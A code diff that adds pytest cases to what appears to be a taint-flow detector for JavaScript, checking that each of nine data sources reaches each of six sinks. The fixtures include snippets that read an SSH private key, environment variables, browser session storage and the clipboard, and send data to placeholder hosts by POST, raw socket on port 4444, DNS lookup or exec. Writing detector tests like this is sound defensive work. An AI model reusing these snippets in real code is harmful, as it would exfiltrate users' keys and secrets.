@@ -948,3 +948,41 @@ class TestDroppedThenRun:
     def test_a_non_dropper_write_or_run_is_quiet(self, name: str) -> None:
         got = [(s, k) for s, k, _ in FlowKit.flows(self.QUIET[name])]
         assert not [p for p in got if "network_response" in p[0] and p[1] in ("process", "execute")]
+
+
+class Pairs:
+    """One snippet for each source kind (it declares `v`) and one for each sink kind (it uses `v`), put together a pair at a time."""
+
+    SOURCES: ClassVar[dict[str, str]] = {
+        "secret_file": 'const fs = require("fs"); const path = require("path"); const os = require("os");\nconst v = fs.readFileSync(path.join(os.homedir(), ".ssh", "id_" + "rsa"));\n',
+        "home_file": 'const fs = require("fs"); const path = require("path"); const os = require("os");\nconst v = fs.readFileSync(path.join(os.homedir(), "notes.txt"));\n',
+        "network_response": 'const r = await fetch("https://api.invalid/x");\nconst v = await r.text();\n',
+        "decoded": 'const v = Buffer.from("aGVsbG8gd29ybGQ=", "base64").toString();\n',
+        "environment": "const v = JSON.stringify(process.env);\n",
+        "identity": 'const v = require("os").hostname();\n',
+        "browser": 'const v = localStorage.getItem("session");\n',
+        "clipboard": 'const clipboardy = require("clipboardy");\nconst v = await clipboardy.read();\n',
+        "wallet_key": "const v = privateKey;\n",
+    }
+    SINKS: ClassVar[dict[str, str]] = {
+        "request": 'fetch("https://h.invalid/u", { method: "POST", body: v });\n',
+        "connection": 'require("net").connect(4444, "h.invalid").write(v);\n',
+        "dns": 'require("dns").lookup(v + ".x.invalid", () => {});\n',
+        "process": 'require("child_process").spawnSync("ffmpeg", ["-i", v]);\n',
+        "open": 'require("child_process").exec("xdg-open https://h.invalid/?q=" + v);\n',
+        "execute": "new Function(v)();\n",
+    }
+
+    @classmethod
+    def program(cls, source: str, sink: str) -> str:
+        return f"async function go(privateKey) {{\n{cls.SOURCES[source]}{cls.SINKS[sink]}}}\ngo(process.argv[2]);\n"
+
+
+class TestEverySourceReachesEverySink:
+    """The nine source kinds against the six sink kinds, one pair a case: each pair is reported as that source reaching that sink."""
+
+    @pytest.mark.parametrize("sink", list(Pairs.SINKS))
+    @pytest.mark.parametrize("source", list(Pairs.SOURCES))
+    def test_the_pair_is_reported(self, source: str, sink: str) -> None:
+        found = {(s, f[1]) for f in FlowKit.flows(Pairs.program(source, sink)) for s in f[0]}
+        assert (source, sink) in found, sorted(found)
